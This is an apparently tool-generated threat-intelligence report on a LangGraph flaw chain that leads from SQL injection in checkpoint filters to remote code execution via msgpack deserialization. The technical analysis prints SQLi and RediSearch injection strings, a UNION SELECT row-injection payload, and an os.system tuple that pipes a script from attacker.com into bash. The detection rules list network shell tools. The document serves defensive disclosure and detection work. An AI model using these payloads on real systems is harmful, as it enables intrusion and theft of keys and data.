# Technical Analysis Report: LangGraph Flaw Chain — SQL Injection to Unauthenticated RCE in Self-Hosted AI Agents (2026-06-14)

Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-06-14
Version: 2.0 (FINAL)

## Executive Summary

Check Point Research disclosed a vulnerability chain in LangGraph, the open-source framework for stateful AI agents (50M+ monthly PyPI downloads), that enables unauthenticated remote code execution on self-hosted deployments. The chain combines three CVEs: **CVE-2025-67644** (CVSS 7.3 — SQL injection in the SQLite checkpoint's metadata filter), **CVE-2026-28277** (CVSS 6.8 — unsafe msgpack deserialization in checkpoint loading), and **CVE-2026-27022** (CVSS 6.5 — RediSearch query injection in the Redis checkpoint). An attacker who can reach the `get_state_history()` endpoint injects SQL via a crafted filter key, writes a malicious msgpack-serialized checkpoint into the database, and triggers arbitrary Python code execution when the application loads the poisoned checkpoint. A compromised agent server exposes LLM API keys, customer data, CRM credentials, conversation history, and internal network access. LangSmith's managed platform is not affected. Patches are available: langgraph-checkpoint-sqlite >= 3.0.1, langgraph >= 1.0.10, @langchain/langgraph-checkpoint-redis >= 1.0.2.

## Background: LangGraph Checkpoint Persistence

LangGraph is a framework by LangChain for building stateful, multi-step AI agents. Agents persist their execution state (conversation history, intermediate outputs, metadata) to a "checkpoint store" — typically SQLite for development/small deployments or Redis for production. The checkpoint store is accessed through the `SqliteSaver` and `RedisSaver` classes. The `get_state_history()` method accepts a user-controlled `filter` parameter for querying checkpoints by metadata. Self-hosted deployments that expose this endpoint (e.g., via LangServe or a custom FastAPI wrapper) without strong authentication are vulnerable.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2025-12-10 | CVE-2025-67644 patched in langgraph-checkpoint-sqlite 3.0.1 |
| 2026-02-20 | CVE-2026-27022 patched in @langchain/langgraph-checkpoint-redis 1.0.2 |
| 2026-03-05 | CVE-2026-28277 patched in langgraph-checkpoint 4.0.1 / langgraph 1.0.10 |
| 2026-06-12 | Check Point Research publishes full chain analysis; Yarden Porat credited |
| 2026-06-12 | The Hacker News coverage published |

## Root Cause: Unsanitized User Input in Persistence Layer

The root cause is a failure to parameterize or validate user-controlled inputs in the checkpoint persistence layer. The SQLite checkpointer uses f-string interpolation for metadata filter **keys** (not just values), the Redis checkpointer directly interpolates filter parameters into RediSearch queries, and the checkpoint loader uses an unrestricted msgpack `ext_hook` that can import and call arbitrary Python modules.

## Technical Analysis of the Malicious Payload

### 1. SQL Injection in SQLite Checkpoint (CVE-2025-67644)

The `_metadata_predicate()` function in `langgraph.checkpoint.sqlite.utils` constructs SQL WHERE clauses using f-string interpolation of user-supplied dictionary keys:

```python
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
```

An attacker supplies a filter like `{"env') OR '1'='1": "dummy"}`, producing:

```sql
WHERE json_extract(CAST(metadata AS TEXT), '$.env') OR '1'='1') = ?
```

This bypasses filter logic and returns all checkpoint records. More critically, a `UNION SELECT` injection can insert a fake checkpoint row containing attacker-controlled serialized data:

```sql
') UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<malicious_blob>', '{}' --
```

The **checkpoints** table has columns: `thread_id`, `checkpoint_ns`, `checkpoint_id`, `parent_checkpoint_id`, `type`, `checkpoint` (BLOB), and `metadata` (BLOB).

**Fix (3.0.1+):** Filter keys are validated against the regex `^[a-zA-Z0-9_.-]+$`, rejecting any key containing SQL metacharacters.

### 2. Unsafe Msgpack Deserialization (CVE-2026-28277)

The `JsonPlusSerializer` class deserializes checkpoint BLOBs using `ormsgpack.unpackb()` with a custom `ext_hook`:

```python
def _msgpack_ext_hook(code: int, data: bytes) -> Any:
    if code == EXT_CONSTRUCTOR_SINGLE_ARG:
        tup = ormsgpack.unpackb(...)
        return getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

The `EXT_CONSTRUCTOR_SINGLE_ARG` extension code triggers arbitrary module import and function invocation. A payload tuple like `["os", "system", "curl http://attacker.com/shell.sh | bash"]` achieves RCE.

**Fix (1.0.10+):** The `LANGGRAPH_STRICT_MSGPACK` environment variable enables an allowlist of safe modules (`datetime`, `uuid`, `decimal`, `ipaddress`, `pathlib`, etc.). The `allowed_msgpack_modules` parameter controls which modules the `ext_hook` may import.

### 3. RediSearch Query Injection (CVE-2026-27022)

The `RedisSaver` and `ShallowRedisSaver` classes construct RediSearch queries by interpolating filter parameters without escaping. The RediSearch `|` (OR) operator can be injected:

```
source: "x}) | (@thread_id:{*"
```

This transforms a query from `(@thread_id:{legitimate-thread}) (@source:{x})` to `(@thread_id:{legitimate-thread}) (@source:{x}) | (@thread_id:{*})`, bypassing thread isolation and returning all checkpoint data.

**Fix (1.0.2+):** An `escapeRediSearchTagValue()` function escapes special characters.

### 4. The Chain: SQLi to RCE

The full exploitation chain:
1. Attacker crafts a msgpack payload encoding `["os", "system", "<shell command>"]` with the `EXT_CONSTRUCTOR_SINGLE_ARG` extension type
2. Attacker sends a request to `get_state_history()` with a malicious filter key containing a `UNION SELECT` that injects a fake checkpoint row with the serialized payload in the `checkpoint` BLOB column
3. The application's `loads_typed()` function deserializes the returned checkpoint, triggering the `_msgpack_ext_hook`
4. The hook imports `os`, retrieves `system`, and executes the attacker's shell command with the privileges of the Python process

### 5. Anti-Forensics / Evasion Techniques

No specific anti-forensics techniques are documented. The attack operates entirely through legitimate application interfaces. Injected checkpoints may persist in the database, providing a forensic artifact.

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### Package / Software Level

| Package / Component | Vulnerable Version | Description |
|---------------------|-------------------|-------------|
| langgraph-checkpoint-sqlite | < 3.0.1 | SQLite checkpoint with unsanitized filter key interpolation (CVE-2025-67644) |
| langgraph | < 1.0.10 | Core framework with unsafe msgpack ext_hook deserialization (CVE-2026-28277) |
| @langchain/langgraph-checkpoint-redis | < 1.0.2 | Redis checkpoint with RediSearch query injection (CVE-2026-27022) |

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Linux | `langgraph/checkpoint/sqlite/utils.py` | N/A | Contains vulnerable `_metadata_predicate()` function |
| Linux | `langgraph/checkpoint/serde/jsonplus.py` | N/A | Contains vulnerable `_msgpack_ext_hook()` with `EXT_CONSTRUCTOR_SINGLE_ARG` |

### Network

No specific C2 domains, IPs, or URLs are associated with this vulnerability. Exploitation occurs through the application's own API endpoints.

### Behavioral

- SQL injection payloads in HTTP request bodies targeting checkpoint filter parameters, containing `UNION SELECT` combined with `json_extract` and `CAST(metadata AS TEXT)`
- Anomalous shell process spawns (sh/bash/dash) from Python web server parent processes (python/uvicorn/gunicorn) — indicative of post-deserialization RCE
- Checkpoint database queries returning unexpected volumes of records (filter bypass)
- Presence of msgpack-serialized BLOBs in the checkpoints table referencing dangerous modules (`os`, `subprocess`, `builtins`)

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | SQL injection via `get_state_history()` filter parameter on self-hosted LangGraph endpoints |
| T1059.006 | Command and Scripting Interpreter: Python | Arbitrary Python code execution via msgpack `ext_hook` importing `os.system` / `subprocess` |

<!-- revision: removed T1203 (Client Execution) — this is server-side exploitation, not client-side. Removed T1195.002 (Supply Chain Compromise) — these are known CVEs in direct dependencies, not supply-chain tampering. -->

## Impact Assessment

**Breadth:** LangGraph has 50M+ monthly PyPI downloads. Any self-hosted deployment using the SQLite or Redis checkpointer with user-accessible `get_state_history()` (or `list()`) endpoints is potentially affected. LangSmith managed platform is not affected.

**Depth:** Full RCE with the privileges of the Python application process. Compromised agents expose LLM API keys, customer data, CRM credentials, conversation history, and internal network access.

**Stealth:** The attack uses legitimate application interfaces with no distinctive network signatures beyond the SQL injection payload itself. Injected checkpoints persist in the database as forensic evidence.

## Detection & Remediation

### Immediate Detection

1. **Check installed package versions:**
   ```bash
   pip show langgraph-checkpoint-sqlite langgraph langgraph-checkpoint 2>/dev/null | grep -E "^(Name|Version):"
   ```

2. **Search for injected checkpoints in SQLite databases:**
   ```sql
   SELECT thread_id, checkpoint_id, type, length(checkpoint) FROM checkpoints
   WHERE type = 'msgpack' AND checkpoint LIKE '%os%system%';
   ```

3. **Check for anomalous shell spawns from Python processes** in process creation logs.

### Remediation

1. **Patch immediately:** Upgrade to langgraph-checkpoint-sqlite >= 3.0.1, langgraph >= 1.0.10, @langchain/langgraph-checkpoint-redis >= 1.0.2
2. **Enable strict deserialization:** Set `LANGGRAPH_STRICT_MSGPACK=1` environment variable — note that this is defense-in-depth and may break legitimate checkpoint deserialization of custom types; test in staging before production deployment
3. **Rotate secrets:** Rotate all LLM API keys, database credentials, and service account tokens accessible from the agent process
4. **Audit checkpoint databases:** Search for anomalous checkpoint entries containing references to `os`, `subprocess`, `builtins`, or other dangerous modules
5. **Implement authentication:** Add strong authentication to all LangGraph API endpoints; do not expose `get_state_history()` to unauthenticated users

### Long-Term Hardening

- Enforce authentication and authorization on all checkpoint query endpoints
- Apply network segmentation to isolate AI agent servers from sensitive internal resources
- Implement WAF rules to detect SQL injection patterns in API request bodies
- Adopt least-privilege principles: run agent processes with minimal permissions
- Enable the `allowed_msgpack_modules` allowlist in production deployments
- Monitor for anomalous process creation from Python WSGI/ASGI server parent processes

## Detection Rules

These detections target the LangGraph CVE-2025-67644 SQLi-to-RCE exploit chain at multiple points: application-layer SQL injection patterns (Sigma, Suricata), post-exploitation shell spawns from Python processes (Sigma), and exploit script file content (YARA). All rules are PoC/advisory-specific; compiles does not equal fires -- verify in your pipeline.

<!-- revision: dropped "Sigma: Vulnerable LangGraph Checkpoint Package Installed" — fires on patched versions too (no version discrimination in process command line); not production-ready. Removed T1203 tag from shell-spawn rule (server-side, not client execution). Downgraded msgpack shell-spawn Sigma and msgpack YARA confidence from high to medium per critic. Added "checkpoint" narrowing keyword to Suricata SQLi rule. Tightened YARA msgpack condition to require 2 of ($hook*) or (LangGraph-specific $hook1/$hook2 + deserialization indicator). -->

### Sigma: LangGraph SQLite Checkpoint SQL Injection via Metadata Filter

Detects UNION SELECT injection patterns targeting the `json_extract(CAST(metadata AS TEXT))` construct in LangGraph checkpoint queries, as seen in CVE-2025-67644 exploitation. Requires a custom Sigma pipeline for `product: python` — no standard pipeline maps this logsource.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check 0; splunk 0; log_scale 0. Keyed on application-log keyword co-occurrence (json_extract + metadata + UNION + SELECT). product: python is non-standard — requires a custom pipeline to map field names; --without-pipeline proves syntax only. Medium confidence because detection depends on log verbosity — silent exploitation (no error logging) will not trigger. -->
```yaml
title: LangGraph SQLite Checkpoint SQL Injection via Metadata Filter
id: 7b3e9c1a-4f2d-4e8a-b6c5-d9f0e1a2b3c4
status: experimental
description: >
    Detects exploitation of CVE-2025-67644 in langgraph-checkpoint-sqlite where
    an attacker injects SQL via unsanitized metadata filter keys in the
    get_state_history() or list() methods, targeting the _metadata_predicate
    function's f-string interpolation of json_extract queries.
references:
    - https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/
    - https://github.com/langchain-ai/langgraph/security/advisories/GHSA-9rwj-6rc7-p77c
    - https://thehackernews.com/2026/06/langgraph-flaw-chain-exposes-self.html
author: Actioner
date: 2026/06/14
tags:
    - attack.t1190
logsource:
    category: application
    product: python
detection:
    selection_sqli_keywords:
        log_message|contains|all:
            - 'json_extract'
            - 'metadata'
            - 'UNION'
            - 'SELECT'
    condition: selection_sqli_keywords
falsepositives:
    - Legitimate SQL debugging logs containing these keywords in combination
level: high
```

### Sigma: LangGraph Unsafe Msgpack Deserialization — Shell Spawn from Python

Detects shell processes spawned from Python web server parents with suspicious command lines indicative of post-exploitation RCE via CVE-2026-28277 msgpack deserialization. This is a TTP-adjacent pattern — DevOps tools using curl/wget from Python parents may false-positive.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check 0; splunk 0; log_scale 0. Keyed on parent-child process chain (python/uvicorn/gunicorn -> sh/bash/dash) with command-line indicators (curl, wget, nc, /dev/tcp, base64 -d, /tmp/pwned). Confidence downgraded from high to medium per critic: this is a TTP-adjacent pattern mislabeled as specific. DevOps curl/wget from Python parents is a known FP source. Requires Sysmon-for-Linux or auditd process creation logging. Removed attack.t1203 tag — server-side exploitation, not client execution. -->
```yaml
title: LangGraph Unsafe Msgpack Deserialization — Shell Spawn from Python
id: a2c4e6f8-1b3d-5a7c-9e0f-d8b6c4a2e0f1
status: experimental
description: >
    Detects indicators of CVE-2026-28277 exploitation where a crafted msgpack
    payload triggers unsafe object reconstruction through the ext_hook in
    LangGraph checkpoint deserialization, potentially importing dangerous
    modules such as os, subprocess, or builtins to achieve RCE.
references:
    - https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/
    - https://github.com/advisories/GHSA-g48c-2wqr-h844
    - https://thehackernews.com/2026/06/langgraph-flaw-chain-exposes-self.html
author: Actioner
date: 2026/06/14
tags:
    - attack.t1059.006
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith:
            - '/python3'
            - '/python'
            - '/uvicorn'
            - '/gunicorn'
    selection_child:
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/dash'
        CommandLine|contains:
            - '/tmp/pwned'
            - 'curl '
            - 'wget '
            - 'nc '
            - 'ncat '
            - '/dev/tcp/'
            - 'base64 -d'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate Python web applications spawning shell commands
    - DevOps automation using curl/wget from Python-based deployment tools
level: high
```

### Sigma: Vulnerable LangGraph Checkpoint Package Installed — DROPPED

<!-- revision: dropped — fires on patched versions too; pip install command line does not carry version information, so the rule cannot distinguish vulnerable from patched packages. Not production-ready. -->

### Suricata: LangGraph SQLi Exploit via HTTP Request Body (CVE-2025-67644)

Detects HTTP POST requests containing UNION SELECT combined with json_extract, metadata, and checkpoint keywords, targeting the LangGraph checkpoint filter SQL injection.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: suricata -T exit 0. Added "checkpoint" content keyword to narrow from generic SQLi to LangGraph-specific traffic. rev bumped to 2. Medium confidence: pattern may still appear in legitimate SQL debugging or other checkpoint-using applications, but the additional keyword reduces generic FP. -->
```suricata
alert http any any -> $HOME_NET any (msg:"Actioner - LangGraph SQLi Exploit via get_state_history Filter (CVE-2025-67644)"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; content:"json_extract"; nocase; content:"metadata"; nocase; content:"checkpoint"; nocase; classtype:web-application-attack; reference:url,research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/; reference:cve,2025-67644; metadata:author Actioner, created_at 2026-06-14; sid:2200001; rev:2;)
```

### Suricata: LangGraph Checkpoint SQLi Filter Key Injection Attempt (CVE-2025-67644)

Detects the specific `') OR '1'='1` SQL injection payload pattern from the published PoC targeting LangGraph checkpoint metadata filter keys.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. Keyed on the exact PoC payload pattern "') OR " followed by "'1'='1". High confidence because this is a highly distinctive string combination that is vanishingly unlikely in legitimate traffic. Fast-pattern on the initial injection fragment. -->
```suricata
alert http any any -> $HOME_NET any (msg:"Actioner - LangGraph Checkpoint SQLi Filter Key Injection Attempt (CVE-2025-67644)"; flow:established,to_server; http.request_body; content:"') OR "; fast_pattern; content:"'1'='1"; distance:0; within:20; classtype:web-application-attack; reference:url,research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/; reference:cve,2025-67644; metadata:author Actioner, created_at 2026-06-14; sid:2200002; rev:1;)
```

### Snort: N/A

Snort is not installed in the validation environment. Equivalent coverage is provided by the Suricata rules above, which share the same detection logic for HTTP-layer inspection.

### YARA: LangGraph SQLi Exploit Script (CVE-2025-67644)

Detects exploit scripts or payloads targeting CVE-2025-67644, keyed on co-occurrence of vulnerable function names (`_metadata_predicate`, `get_state_history`, `SqliteSaver`), SQL injection constructs, and LangGraph package references. Scope to source/upload directories, not your general document store.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. Positive: constructed PoC file with published strings (SqliteSaver, _metadata_predicate, get_state_history, UNION SELECT, langgraph.checkpoint.sqlite, ') OR '1'='1). Negative: benign sqlite3 script — no match. High confidence: requires co-occurrence of LangGraph-specific function names + SQLi payload + package reference, which is extremely unlikely in benign files. -->
```yara
rule Exploit_CVE_2025_67644_LangGraph_SQLi_PoC
{
    meta:
        description = "Detects exploit scripts or payloads targeting CVE-2025-67644 LangGraph SQLite checkpoint SQL injection via metadata filter key manipulation"
        author = "Actioner"
        date = "2026-06-14"
        reference = "https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/"
        severity = "high"

    strings:
        $vuln_func1 = "_metadata_predicate" ascii
        $vuln_func2 = "get_state_history" ascii
        $vuln_func3 = "SqliteSaver" ascii

        $sqli1 = "UNION SELECT" ascii nocase
        $sqli2 = "json_extract" ascii nocase
        $sqli3 = "CAST(metadata AS TEXT)" ascii nocase

        $payload1 = "') OR '1'='1" ascii
        $payload2 = "checkpoint_ns" ascii
        $payload3 = "parent_checkpoint_id" ascii

        $pkg1 = "langgraph-checkpoint-sqlite" ascii
        $pkg2 = "langgraph.checkpoint.sqlite" ascii

    condition:
        filesize < 500KB and
        (1 of ($pkg*)) and
        (1 of ($sqli*) or 1 of ($payload*)) and
        (1 of ($vuln_func*))
}
```

### YARA: LangGraph Msgpack Deserialization RCE Exploit (CVE-2026-28277)

Detects exploit scripts targeting CVE-2026-28277, keyed on the `_msgpack_ext_hook` / `EXT_CONSTRUCTOR_SINGLE_ARG` deserialization mechanism combined with dangerous module imports and LangGraph context.
**Status:** compile ✅ compiles · confidence: medium · sample: fired ✓
<!-- audit: yarac exit 0. Condition tightened per critic: now requires 2 of ($hook*) — or at least one LangGraph-specific hook ($hook1/$hook2) plus a deserialization indicator ($deser*) — preventing $hook3="ext_hook" alone from satisfying the hook clause. Positive: constructed PoC file with published strings (_msgpack_ext_hook, EXT_CONSTRUCTOR_SINGLE_ARG, ormsgpack.unpackb, importlib.import_module, os.system, langgraph, checkpoint, loads_typed) — fired. Negative: benign msgpack script — no match. Confidence downgraded from high to medium: "ext_hook" and "checkpoint" are generic enough that the rule may fire on non-exploit security research or tooling. severity meta field lowered from critical to high. -->
```yara
rule Exploit_CVE_2026_28277_LangGraph_Msgpack_RCE
{
    meta:
        description = "Detects exploit scripts targeting CVE-2026-28277 LangGraph unsafe msgpack deserialization via ext_hook for arbitrary code execution"
        author = "Actioner"
        date = "2026-06-14"
        reference = "https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/"
        severity = "high"

    strings:
        $hook1 = "_msgpack_ext_hook" ascii
        $hook2 = "EXT_CONSTRUCTOR_SINGLE_ARG" ascii
        $hook3 = "ext_hook" ascii

        $deser1 = "ormsgpack.unpackb" ascii
        $deser2 = "msgpack.unpackb" ascii
        $deser3 = "importlib.import_module" ascii

        $rce1 = "os.system" ascii
        $rce2 = "subprocess" ascii
        $rce3 = "__import__" ascii

        $ctx1 = "langgraph" ascii
        $ctx2 = "checkpoint" ascii
        $ctx3 = "loads_typed" ascii

    condition:
        filesize < 1MB and
        (2 of ($hook*) or (1 of ($hook1, $hook2) and 1 of ($deser*))) and
        (1 of ($rce*)) and
        (1 of ($ctx*))
}
```

## Lessons Learned

This vulnerability chain demonstrates that AI agent frameworks introduce a new attack surface where the agent's memory (checkpoint/state persistence) becomes the exploitation vector. The combination of a "moderate" SQL injection with a "moderate" deserialization flaw chains into critical RCE -- individual CVSS scores understate the composite risk. Self-hosted AI agent deployments must be treated as internet-facing applications requiring authentication, input validation, and network segmentation, not as internal development tools. The checkpoint persistence layer is analogous to a database ORM and requires the same parameterized-query discipline.

## Sources

<!-- Every source MUST be a markdown link [Name](URL). A source without a URL is a bug. -->

- [Check Point Research — From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) — primary technical analysis by Yarden Porat detailing the full exploit chain
- [GitHub Advisory GHSA-9rwj-6rc7-p77c](https://github.com/langchain-ai/langgraph/security/advisories/GHSA-9rwj-6rc7-p77c) — vendor advisory for CVE-2025-67644 (SQLite checkpoint SQLi)
- [GitHub Advisory GHSA-g48c-2wqr-h844](https://github.com/advisories/GHSA-g48c-2wqr-h844) — vendor advisory for CVE-2026-28277 (unsafe msgpack deserialization)
- [CIRCL Vulnerability Lookup — CVE-2026-27022](https://vulnerability.circl.lu/vuln/cve-2026-27022) — CVE details for RediSearch query injection
- [The Hacker News — LangGraph Flaw Chain Exposes Self-Hosted AI Agents](https://thehackernews.com/2026/06/langgraph-flaw-chain-exposes-self.html) — news coverage of the disclosure
- [GitHub PoC — CVE-2025-67644 LangGraph SQLite Checkpoint SQL Injection](https://github.com/mbanyamer/CVE-2025-67644-LangGraph-3.0.1-SQLite-Checkpoint-SQL-Injection) — public PoC exploit script

---
*Report generated by Actioner*
